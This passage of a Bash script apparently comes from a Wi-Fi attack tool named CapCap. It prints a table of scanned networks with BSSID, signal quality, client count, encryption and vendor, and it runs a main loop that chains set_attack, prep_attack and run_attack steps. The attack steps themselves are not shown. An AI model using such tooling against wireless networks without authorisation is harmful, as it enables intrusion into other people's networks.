    "CH" "BSSID" "PWR" "CLNT" "QLTY" "ENC" "VENDOR" "ESSID"
  printf "%-4s %-17s %-4s %-5s %-4s %-10s %-30s %s\n" \
    "---" "-----------------" "---" "-----" "----" "----------" "------------------------------" "----"

  # Print each network.
  local info
  for info in "${candidates[@]}"; do
    info=$(echo "$info" | sed -r "s/,\s*/,/g")

    local mac=$(echo "$info" | cut -d , -f 1)
    local channel=$(echo "$info" | cut -d , -f 4 | tr -d ' ')
    local security=$(echo "$info" | cut -d , -f 6)
    local power=$(echo "$info" | cut -d , -f 9)
    local essid=$(echo "$info" | cut -d , -f 14 | sed 's/^ //;s/ *$//')

    local clientCount=$(printf '%s\n' "${clients[@]}" | grep -c "$mac" 2>/dev/null; true)

    local vendor="${vendorLookup[$mac]}"
    if [ -z "$vendor" ]; then
      vendor=$(macchanger -l 2>/dev/null | grep -i "${mac:0:8}" | cut -d ' ' -f 5- | head -1)
    fi

    # Calculate quality.
    local quality
    if [ "$power" -eq -1 ] 2>/dev/null; then
      quality="??"
    elif [ "$power" -le -90 ] 2>/dev/null; then
      quality="0%"
    elif [ "$power" -gt -60 ] 2>/dev/null; then
      quality="100%"
    else
      quality="$(( (power * 10 - (-90) * 10) / ((-60 - (-90)) / 10) ))%"
    fi

    printf "%-4s %-17s %-4s %-5s %-4s %-10s %-30.30s %s\n" \
      "$channel" "$mac" "$power" "$clientCount" "$quality" "$security" "${vendor:--}" "$essid"
  done

  echo >&2
  echo "${#candidates[@]} network(s) found." >&2

  # Cleanup.
  sandbox_remove_workfile "$CAPCAPWorkspacePath/dump*"
  capcap_deallocate_interface "$scanInterface" 2>/dev/null

  exit 0
}

# ============================================================ #
# ===================== < CAPWIFI Loop > ===================== #
# ============================================================ #
capcap_main() {
  # If scan-only mode, run the scan and exit.
  if [ "$CAPCAPScanOnly" ]; then
    capcap_scan_only
  fi

  capcap_startup

  capcap_set_resolution

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  local sequence=(
    "set_language"
    "set_attack"
    "prep_attack"
    "run_attack"
  )

  while true; do # CapCap's runtime-loop.
    if ! capcap_do_sequence capcap sequence[@] && [ "$CAPCAPAuto" ]; then
      capcap_status "RESULT none"
      exit 1
    fi
  done

  capcap_shutdown
}

capcap_main # Start CapCap

# CAPWIFI END
